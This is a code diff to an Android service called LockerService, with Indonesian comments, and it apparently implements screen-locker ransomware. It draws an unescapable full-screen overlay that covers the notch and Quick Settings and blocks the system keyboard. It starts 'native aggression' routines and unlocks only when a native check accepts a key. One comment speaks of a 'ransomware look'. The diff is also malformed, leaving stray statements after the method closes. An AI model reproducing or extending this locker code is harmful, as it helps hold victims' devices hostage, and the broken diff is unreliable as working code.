@@ -147,52 +147,107 @@ public class LockerService extends Service {
         );
     }
 
-    @Override
-    public void onCreate() {
-        super.onCreate();
+    private String currentInput = ""; // Tambahkan di bawah deklarasi variabel class
 
-        startInForeground();
-        startStatusBarLocker();
+        @Override
+        public void onCreate() {
+            super.onCreate();
 
-        // Inisialisasi Kamera untuk Senter
-        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
-        try {
-            String[] ids = cameraManager.getCameraIdList();
-            if (ids.length > 0) cameraId = ids[0];
-        } catch (Exception e) {}
+            startInForeground();
+            startStatusBarLocker();
 
-        // Register receiver untuk deteksi tombol power (layar mati)
-        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
-        registerReceiver(screenReceiver, filter);
+            // 1. Inisialisasi Kamera & Senter
+            cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
+            try {
+                String[] ids = cameraManager.getCameraIdList();
+                if (ids.length > 0) cameraId = ids[0];
+            } catch (Exception e) {}
 
-        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
+            // 2. Register Power Button Receiver
+            IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
+            registerReceiver(screenReceiver, filter);
 
-        lockerLayout.setFitsSystemWindows(false);
-        // Ubah dari hitam pekat (0xFF000000) ke warna yang lebih soft jika ingin menghindari kesan dark mode paksa
-        // Atau tetap hitam jika ini memang untuk ransomware look
-        lockerLayout.setBackgroundColor(0xFF000000);
+            // 3. Setup Window Manager & Layout
+            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);
+            lockerLayout.setFitsSystemWindows(false);
+            lockerLayout.setBackgroundColor(0xFF000000); // Hitam pekat hacker style
 
-        applyFullScreen();
+            applyFullScreen();
 
-        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | // Render di bawah status bar
-            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS | // Menembus batas layar (poni/status bar)
-            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | 
-            WindowManager.LayoutParams.FLAG_SPLIT_TOUCH |
-            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
-            PixelFormat.TRANSLUCENT);
+            // 4. Konfigurasi LayoutParams (Memblokir Keyboard Sistem)
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |      // Kunci fokus (Blokir Gboard/Samsung Keyboard)
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
+                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS | 
+                    WindowManager.LayoutParams.FLAG_FULLSCREEN |        
+                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED |
+                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
+                    PixelFormat.TRANSLUCENT);
 
-        // Paksa menutupi area Notch (Poni) agar Quick Settings tidak bisa diintip dari pojok
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+            params.gravity = Gravity.FILL;
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+            }
+
+            windowManager.addView(lockerLayout, params);
+
+            // 5. Jalankan Native Aggression (C++ Logic)
+            startNativeAggression(getPackageName() + "/.LockerService");
+            flashHandler.post(flashRunnable);
+
+            // 6. LOGIKA NATIVE KEYBOARD (Style Glow Hacker)
+            TextView display = lockerLayout.findViewById(R.id.textDisplayPassword);
+            
+            // Listener untuk tombol angka 0-9
+            View.OnClickListener numListener = v -> {
+                Button b = (Button) v;
+                if (currentInput.length() < 12) { // Maksimum 12 karakter
+                    currentInput += b.getText().toString();
+                    display.setText(currentInput.replaceAll(".", "* ")); // Efek masking bintang
+                }
+            };
+
+            // Pasang listener ke semua ID tombol numerik
+            int[] buttonIds = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4, 
+                            R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
+            for (int id : buttonIds) {
+                View btn = lockerLayout.findViewById(id);
+                if (btn != null) btn.setOnClickListener(numListener);
+            }
+
+            // Tombol Delete / Backspace
+            View btnDel = lockerLayout.findViewById(R.id.btnDelete);
+            if (btnDel != null) {
+                btnDel.setOnClickListener(v -> {
+                    if (currentInput.length() > 0) {
+                        currentInput = currentInput.substring(0, currentInput.length() - 1);
+                        display.setText(currentInput.replaceAll(".", "* "));
+                    }
+                });
+            }
+
+            // Tombol Unlock (OK)
+            View btnUnlock = lockerLayout.findViewById(R.id.btnUnlock);
+            if (btnUnlock != null) {
+                btnUnlock.setOnClickListener(v -> {
+                    // Memanggil verifikasi native C++ dengan input manual
+                    if (verifyAdvancedKey(currentInput)) {
+                        isAuthenticated = true;
+                        stopNativeAggression();
+                        stopSelf();
+                    } else {
+                        currentInput = "";
+                        display.setText("");
+                        display.setHint("ACCESS DENIED"); // Feedback ala hacker
+                    }
+                });
+            }
         }
-        
-        // Memastikan overlay dapat menerima input keyboard untuk password
-        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
 
         params.gravity = Gravity.CENTER;
         windowManager.addView(lockerLayout, params);
